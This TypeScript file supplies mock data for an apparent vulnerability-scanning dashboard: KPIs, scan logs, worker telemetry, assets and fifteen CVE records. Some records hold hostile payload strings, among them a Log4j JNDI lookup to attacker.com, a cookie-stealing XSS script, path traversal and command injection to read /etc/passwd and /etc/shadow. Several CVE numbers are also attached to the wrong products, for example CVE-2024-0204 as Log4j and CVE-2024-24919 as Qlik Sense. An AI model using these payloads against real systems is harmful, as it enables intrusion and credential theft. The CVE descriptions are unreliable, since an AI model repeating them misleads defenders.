import type {
  Asset,
  KpiMetric,
  ScanEvent,
  TimelineEvent,
  Vulnerability,
  WorkerTelemetry,
} from "@/types";
import { generateId } from "@/lib/utils";

const random = (min: number, max: number) =>
  Math.round(min + Math.random() * (max - min));

export function generateDynamicKpis(): KpiMetric[] {
  return [
    { id: "1", label: "Total Assets", value: (random(2700, 3100)).toLocaleString(), change: +(random(8, 18)).toFixed(1), changeLabel: "vs last scan", icon: "dns" },
    { id: "2", label: "Vulnerabilities", value: (random(1100, 1400)).toLocaleString(), change: -random(5, 15), changeLabel: "vs last scan", icon: "warning" },
    { id: "3", label: "Critical", value: String(random(75, 110)), change: +(random(1, 6)).toFixed(1), changeLabel: "new this week", icon: "dangerous" },
    { id: "4", label: "Scan Coverage", value: (random(90, 98) + "." + random(0, 9) + "%"), change: +(random(1, 4)).toFixed(1), changeLabel: "vs last scan", icon: "radar" },
    { id: "5", label: "Active Threats", value: String(random(18, 35)), change: -random(10, 22), changeLabel: "vs yesterday", icon: "shield" },
    { id: "6", label: "Avg Response", value: (random(8, 18) / 10).toFixed(1) + "s", change: -random(3, 9), changeLabel: "improved", icon: "bolt" },
  ];
}

export function generateDynamicTimeline(): TimelineEvent[] {
  const now = Date.now();
  return [
    { id: "tl-1", timestamp: new Date(now - random(3000000, 7200000)).toISOString(), type: "discovery", label: "Subdomain discovery completed", asset: "*.corp.internal", status: "completed" },
    { id: "tl-2", timestamp: new Date(now - random(1200000, 2800000)).toISOString(), type: "scan", label: "Port scan initiated", asset: `10.0.${random(1, 5)}.0/24`, status: "in_progress" },
    { id: "tl-3", timestamp: new Date(now - random(600000, 1100000)).toISOString(), type: "vulnerability", label: ["CVE-2024-21626 detected", "CVE-2024-27198 matched", "New RCE signature found"][random(0, 2)], asset: ["api-gateway-01", "jenkins-master", "web-prod-03"][random(0, 2)], status: "completed" },
    { id: "tl-4", timestamp: new Date(now - random(120000, 500000)).toISOString(), type: "exploit", label: ["RCE payload tested", "SQL injection verified", "XSS confirmed"][random(0, 2)], asset: ["web-prod-03", "api-prod-05", "dashboard.internal"][random(0, 2)], status: "pending" },
    { id: "tl-5", timestamp: new Date(now - random(10000, 110000)).toISOString(), type: "discovery", label: ["New certificate transparency log", "DNS zone transfer complete", "New subdomain: admin.internal"][random(0, 2)], asset: "*.staging.internal", status: random(0, 1) ? "in_progress" : "completed" },
  ];
}

export function getDynamicVulnerabilities(): Vulnerability[] {
  return JSON.parse(JSON.stringify(mockVulnerabilitiesSeed));
}

const mockVulnerabilitiesSeed: Vulnerability[] = [
  { id: "vuln-1", title: "CVE-2024-21626 - Container Escape in runc", severity: "CRITICAL", cvss: 9.8, asset: "docker-host-01.prod", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(1, 3)).toISOString(), description: "A container escape vulnerability in runc allows a malicious container to overwrite the host runc binary, leading to full host compromise. Affects all Docker installations with runc < 1.1.12.", exploitPayload: "POST /api/v1/containers/exec HTTP/1.1\nHost: docker-host-01.prod:8443\nContent-Type: application/json\n{\"cmd\": \"cat /etc/shadow\"}" },
  { id: "vuln-2", title: "CVE-2024-27198 - JetBrains Authentication Bypass", severity: "CRITICAL", cvss: 9.1, asset: "jenkins-master.internal", status: "IN_PROGRESS", discovered: new Date(Date.now() - 86400000 * random(2, 5)).toISOString(), description: "An authentication bypass vulnerability in JetBrains TeamCity allows an unauthenticated attacker to execute arbitrary code on the server via a crafted HTTP request.", exploitPayload: "GET /app/rest/server HTTP/1.1\nHost: jenkins-master.internal:8111\nAuthorization: Bearer [bypassed]" },
  { id: "vuln-3", title: "CVE-2024-0204 - RCE in Apache Log4j 2", severity: "HIGH", cvss: 8.6, asset: "logstash-worker-02", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(3, 7)).toISOString(), description: "A remote code execution vulnerability in Apache Log4j 2 allows unauthenticated remote code execution via JNDI lookups. Affects log4j-core versions < 2.17.1.", exploitPayload: "${jndi:ldap://attacker.com:1389/Exploit}" },
  { id: "vuln-4", title: "CVE-2024-28741 - SQL Injection in Search API", severity: "HIGH", cvss: 8.3, asset: "api-prod-05.internal", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(4, 8)).toISOString(), description: "A SQL injection vulnerability in the search functionality of the internal API allows an authenticated attacker to extract sensitive data from the PostgreSQL database." },
  { id: "vuln-5", title: "CVE-2024-30990 - Stored XSS in Admin Dashboard", severity: "MEDIUM", cvss: 6.4, asset: "dashboard.internal", status: "RESOLVED", discovered: new Date(Date.now() - 86400000 * random(5, 10)).toISOString(), description: "A stored cross-site scripting vulnerability in the admin dashboard allows an attacker with editor privileges to inject malicious JavaScript into report views.", exploitPayload: "<script>fetch('/api/tokens?q='+document.cookie)</script>" },
  { id: "vuln-6", title: "CVE-2024-31125 - Privilege Escalation in Auth Service", severity: "MEDIUM", cvss: 5.9, asset: "auth-service-01", status: "IN_PROGRESS", discovered: new Date(Date.now() - 86400000 * random(6, 12)).toISOString(), description: "A privilege escalation vulnerability in the authentication service allows a standard user to gain admin privileges via a crafted JWT token." },
  { id: "vuln-7", title: "CVE-2024-21887 - Command Injection in VPN", severity: "CRITICAL", cvss: 9.2, asset: "vpn-gateway-01", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(1, 4)).toISOString(), description: "A command injection vulnerability in the web interface of Ivanti VPN allows an authenticated attacker to execute arbitrary commands with root privileges.", exploitPayload: "GET /?a=1;id HTTP/1.1\nHost: vpn-gateway-01" },
  { id: "vuln-8", title: "CVE-2024-24919 - Path Traversal in Qlik Sense", severity: "HIGH", cvss: 8.7, asset: "analytics-qlik-01", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(2, 5)).toISOString(), description: "A path traversal vulnerability in Qlik Sense Enterprise for Windows allows an unauthenticated attacker to read arbitrary files on the server.", exploitPayload: "../../../../etc/passwd" },
  { id: "vuln-9", title: "CVE-2024-23897 - Jenkins CLI Arbitrary Read", severity: "HIGH", cvss: 7.5, asset: "jenkins-master.internal", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(3, 6)).toISOString(), description: "Jenkins CLI allows unauthenticated attackers to read arbitrary files on the Jenkins controller using the args4j library's @Argument annotation." },
  { id: "vuln-10", title: "CVE-2024-31497 - SSH Private Key Recovery", severity: "MEDIUM", cvss: 5.3, asset: "gitlab-runner-01", status: "IN_PROGRESS", discovered: new Date(Date.now() - 86400000 * random(4, 8)).toISOString(), description: "A side-channel attack on PuTTY versions 0.68 through 0.80 allows recovery of NIST P-521 private keys from a limited number of signatures." },
  { id: "vuln-11", title: "CVE-2024-27316 - HTTP/2 Continuation Flood", severity: "HIGH", cvss: 7.1, asset: "api-gateway-01", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(1, 3)).toISOString(), description: "HTTP/2 CONTINUATION frames can be used for DoS attacks by exhausting server memory. Affects nginx versions before 1.25.5." },
  { id: "vuln-12", title: "CVE-2024-22252 - VMware ESXi Escape", severity: "CRITICAL", cvss: 9.3, asset: "esxi-host-01.vsphere", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(1, 2)).toISOString(), description: "A use-after-free vulnerability in XHCI USB controller in VMware ESXi allows a malicious guest to execute code on the host.", exploitPayload: "VMX: usb_xhci.ctl=0x41414141" },
  { id: "vuln-13", title: "CVE-2024-1709 - ConnectWise ScreenConnect Auth Bypass", severity: "CRITICAL", cvss: 9.0, asset: "remote-support-01", status: "RESOLVED", discovered: new Date(Date.now() - 86400000 * random(7, 14)).toISOString(), description: "An authentication bypass vulnerability in ConnectWise ScreenConnect 23.9.7 allows an unauthenticated attacker to remotely execute code." },
  { id: "vuln-14", title: "CVE-2024-21762 - FortiOS SSLVPN RCE", severity: "CRITICAL", cvss: 8.9, asset: "fortigate-01.internal", status: "OPEN", discovered: new Date(Date.now() - 86400000 * random(1, 3)).toISOString(), description: "A out-of-bounds write vulnerability in FortiOS allows a remote unauthenticated attacker to execute arbitrary code via specifically crafted HTTP requests." },
  { id: "vuln-15", title: "CVE-2024-25153 - Apache Tomcat RCE", severity: "HIGH", cvss: 8.1, asset: "tomcat-app-01", status: "RESOLVED", discovered: new Date(Date.now() - 86400000 * random(10, 20)).toISOString(), description: "A remote code execution vulnerability in Apache Tomcat when running on Windows with default servlet enabled allows uploading of malicious files." },
];

export function getDynamicAssets(): Asset[] {
  return JSON.parse(JSON.stringify(mockAssetsSeed));
}

const mockAssetsSeed: Asset[] = [
  {
    id: "asset-1", hostname: "api-gateway-01.prod.internal", ip: "10.0.1.45", riskScore: random(78, 88),
    technologies: ["Nginx 1.24", "Node.js 20.11", "Redis 7.2", "PostgreSQL 16"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 8443, service: "HTTPS-Alt", state: "open" }, { port: 6379, service: "Redis", state: "filtered" }, { port: 5432, service: "PostgreSQL", state: "filtered" }],
    dnsRecords: [{ type: "A", value: "10.0.1.45" }, { type: "AAAA", value: "fd00::1:45" }, { type: "CNAME", value: "api.prod.internal" }, { type: "TXT", value: "v=spf1 include:_spf.prod.internal ~all" }],
    headers: [{ name: "Server", value: "nginx/1.24.0" }, { name: "X-Frame-Options", value: "DENY" }, { name: "Strict-Transport-Security", value: "max-age=31536000" }, { name: "X-Content-Type-Options", value: "nosniff" }, { name: "X-XSS-Protection", value: "1; mode=block" }],
  },
  {
    id: "asset-2", hostname: "jenkins-master.internal", ip: "10.0.2.12", riskScore: random(85, 95),
    technologies: ["Jenkins 2.440", "Java 17", "Tomcat 9", "Nginx 1.22"],
    ports: [{ port: 8080, service: "HTTP-Proxy", state: "open" }, { port: 50000, service: "JNLP", state: "open" }, { port: 22, service: "SSH", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.2.12" }, { type: "CNAME", value: "ci.internal" }],
    headers: [{ name: "Server", value: "Jenkins/2.440" }, { name: "X-Jenkins", value: "2.440" }, { name: "X-Frame-Options", value: "SAMEORIGIN" }],
  },
  {
    id: "asset-3", hostname: "docker-host-01.prod", ip: "10.0.3.78", riskScore: random(68, 82),
    technologies: ["Docker 24.0", "Ubuntu 22.04 LTS", "containerd 1.7", "Linux Kernel 6.2"],
    ports: [{ port: 2376, service: "Docker-TLS", state: "open" }, { port: 22, service: "SSH", state: "open" }, { port: 9100, service: "Node-Exporter", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.3.78" }, { type: "PTR", value: "docker-host-01.prod.internal" }],
    headers: [],
  },
  {
    id: "asset-4", hostname: "vpn-gateway-01.perimeter", ip: "203.0.113.45", riskScore: random(88, 96),
    technologies: ["Ivanti Connect Secure 22.4", "Linux 4.19"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 8443, service: "SSL-VPN", state: "open" }, { port: 22, service: "SSH", state: "filtered" }],
    dnsRecords: [{ type: "A", value: "203.0.113.45" }, { type: "CNAME", value: "vpn.company.com" }, { type: "TXT", value: "v=spf1 -all" }],
    headers: [{ name: "Server", value: "Ivanti/22.4" }, { name: "X-Frame-Options", value: "DENY" }],
  },
  {
    id: "asset-5", hostname: "logstash-worker-02.logging", ip: "10.0.4.22", riskScore: random(55, 70),
    technologies: ["Logstash 8.11", "Elasticsearch 8.11", "Java 17", "Ubuntu 22.04"],
    ports: [{ port: 5044, service: "Logstash-Beats", state: "open" }, { port: 9600, service: "Logstash-API", state: "open" }, { port: 22, service: "SSH", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.4.22" }, { type: "CNAME", value: "logs.internal" }],
    headers: [],
  },
  {
    id: "asset-6", hostname: "fortigate-01.internal", ip: "10.0.0.1", riskScore: random(75, 85),
    technologies: ["FortiOS 7.4", "FortiGate 400F"],
    ports: [{ port: 443, service: "HTTPS-Admin", state: "open" }, { port: 22, service: "SSH", state: "filtered" }, { port: 8443, service: "SSL-VPN", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.0.1" }, { type: "CNAME", value: "firewall.internal" }],
    headers: [{ name: "Server", value: "FortiGate/7.4" }],
  },
  {
    id: "asset-7", hostname: "gitlab-runner-01.ci", ip: "10.0.5.33", riskScore: random(45, 58),
    technologies: ["GitLab Runner 16.8", "Docker 24.0", "Ubuntu 22.04", "Go 1.21"],
    ports: [{ port: 22, service: "SSH", state: "open" }, { port: 9252, service: "Metrics", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.5.33" }, { type: "CNAME", value: "runner.ci.internal" }],
    headers: [],
  },
  {
    id: "asset-8", hostname: "auth-service-01.security", ip: "10.0.6.88", riskScore: random(60, 72),
    technologies: ["Keycloak 23.0", "Java 17", "PostgreSQL 16", "Nginx 1.24"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 8443, service: "HTTPS-Admin", state: "open" }, { port: 5432, service: "PostgreSQL", state: "filtered" }],
    dnsRecords: [{ type: "A", value: "10.0.6.88" }, { type: "CNAME", value: "auth.internal" }, { type: "TXT", value: "v=spf1 include:auth.internal ~all" }],
    headers: [{ name: "Server", value: "nginx/1.24.0" }, { name: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains" }],
  },
  {
    id: "asset-9", hostname: "esxi-host-01.vsphere", ip: "10.0.7.15", riskScore: random(82, 92),
    technologies: ["VMware ESXi 8.0 Update 2", "vCenter 8.0"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 902, service: "VMware-Auth", state: "open" }, { port: 22, service: "SSH", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.7.15" }, { type: "PTR", value: "esxi-host-01.vsphere.internal" }],
    headers: [{ name: "Server", value: "VMware ESXi/8.0.2" }],
  },
  {
    id: "asset-10", hostname: "analytics-qlik-01.bi", ip: "10.0.8.55", riskScore: random(70, 80),
    technologies: ["Qlik Sense Enterprise 14.8", "Windows Server 2022", "IIS 10"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 4244, service: "Qlik-Engine", state: "open" }, { port: 4243, service: "Qlik-Proxy", state: "open" }, { port: 3389, service: "RDP", state: "filtered" }],
    dnsRecords: [{ type: "A", value: "10.0.8.55" }, { type: "CNAME", value: "analytics.internal" }],
    headers: [{ name: "Server", value: "Microsoft-IIS/10.0" }, { name: "X-Powered-By", value: "ASP.NET" }],
  },
  {
    id: "asset-11", hostname: "remote-support-01.tools", ip: "10.0.9.77", riskScore: random(50, 65),
    technologies: ["ConnectWise ScreenConnect 23.9", "Windows Server 2022"],
    ports: [{ port: 443, service: "HTTPS", state: "open" }, { port: 8041, service: "ScreenConnect", state: "open" }, { port: 22, service: "SSH", state: "closed" }],
    dnsRecords: [{ type: "A", value: "10.0.9.77" }, { type: "CNAME", value: "support.internal" }],
    headers: [{ name: "Server", value: "ConnectWise/23.9" }],
  },
  {
    id: "asset-12", hostname: "tomcat-app-01.legacy", ip: "10.0.10.101", riskScore: random(72, 84),
    technologies: ["Apache Tomcat 9.0", "Java 11", "CentOS 7", "Apache HTTPD 2.4"],
    ports: [{ port: 8080, service: "HTTP", state: "open" }, { port: 8009, service: "AJP", state: "open" }, { port: 22, service: "SSH", state: "open" }],
    dnsRecords: [{ type: "A", value: "10.0.10.101" }, { type: "CNAME", value: "legacy-app.internal" }],
    headers: [{ name: "Server", value: "Apache-Coyote/1.1" }, { name: "X-Powered-By", value: "Servlet/4.0" }],
  },
];

export function getDynamicTelemetry(): WorkerTelemetry[] {
  return mockTelemetrySeed.map((t) => ({
    ...t,
    cpu: Math.min(100, Math.max(5, t.cpu + random(-8, 10))),
    memory: Math.min(100, Math.max(10, t.memory + random(-6, 8))),
    tasksCompleted: t.tasksCompleted + random(0, 5),
    status: Math.random() > 0.85 ? ("error" as const) : Math.random() > 0.5 ? ("busy" as const) : ("idle" as const),
  }));
}

const mockTelemetrySeed: WorkerTelemetry[] = [
  { id: "w1", name: "Scanner-01", status: "busy", tasksCompleted: 847, currentTask: "Port scan: 10.0.1.0/24", cpu: 68, memory: 72 },
  { id: "w2", name: "Scanner-02", status: "idle", tasksCompleted: 1234, cpu: 12, memory: 34 },
  { id: "w3", name: "Enricher-01", status: "busy", tasksCompleted: 2561, currentTask: "DNS resolution: *.staging.internal", cpu: 45, memory: 61 },
  { id: "w4", name: "Exploit-01", status: "error", tasksCompleted: 89, currentTask: "Payload delivery: CVE-2024-21626", cpu: 92, memory: 88 },
  { id: "w5", name: "Monitor-01", status: "busy", tasksCompleted: 3402, currentTask: "Certificate transparency monitoring", cpu: 33, memory: 45 },
  { id: "w6", name: "Scanner-03", status: "idle", tasksCompleted: 567, cpu: 8, memory: 22 },
  { id: "w7", name: "Analyzer-01", status: "busy", tasksCompleted: 1891, currentTask: "Vulnerability correlation analysis", cpu: 72, memory: 68 },
  { id: "w8", name: "Recon-01", status: "busy", tasksCompleted: 4523, currentTask: "Subdomain enumeration: corp.internal", cpu: 56, memory: 59 },
];

const scanEventTypes = ["INFO", "WARN", "ERROR", "CRITICAL"] as const;
const scanSources = [
  "scanner.node", "enricher.dns", "exploit.engine", "monitor.cert",
  "analyzer.port", "detector.vuln", "scanner.port", "recon.subdomain",
  "analyzer.header", "monitor.ssl",
];

const scanMessages = [
  "Discovered new subdomain: api.internal.corp",
  "Port 8443 open on 10.0.1.45",
  "TLS certificate expired on mail.internal",
  "CVE-2024-21626 signature matched on docker-host",
  "DNS A record updated for gateway.prod",
  "Rate limit hit on target 10.0.2.0/24",
  "New JavaScript dependency detected on web-prod",
  "WAF bypass payload generated for api-gateway",
  "SSL/TLS downgrade test initiated on 10.0.1.45",
  "Response time anomaly detected on auth-service",
  "Certificate transparency log entry found for *.corp",
  "Open S3 bucket detected: assets.corp.internal",
  "JWT token leaked in page source on dashboard.internal",
  "CORS misconfiguration detected on api-gateway-01",
  "Server header discloses nginx version on 10.0.1.45",
  "New host discovered: 10.0.11.22 (unknown)",
  "SSH brute force attempt detected from 45.33.22.11",
  "DNS zone transfer allowed on ns1.corp.internal",
  "WebSocket endpoint discovered on api-gateway:9443",
  "GraphQL introspection enabled on api-gateway/graphql",
  "Directory listing enabled on legacy-app:8080/uploads",
  "Default credentials tested on jenkins-master:8080",
  "Open redirect found on auth.internal/logout",
  "S3 bucket contents exposed: backup.corp.internal",
  "Suspicious outbound connection from docker-host-01",
];

export function generateScanEvent(): ScanEvent {
  const type = scanEventTypes[Math.floor(Math.random() * scanEventTypes.length)];
  return {
    id: generateId(),
    timestamp: new Date().toISOString(),
    type,
    source: scanSources[Math.floor(Math.random() * scanSources.length)],
    message: scanMessages[Math.floor(Math.random() * scanMessages.length)],
  };
}

export function generateScanEvents(count: number): ScanEvent[] {
  return Array.from({ length: count }, () => generateScanEvent());
}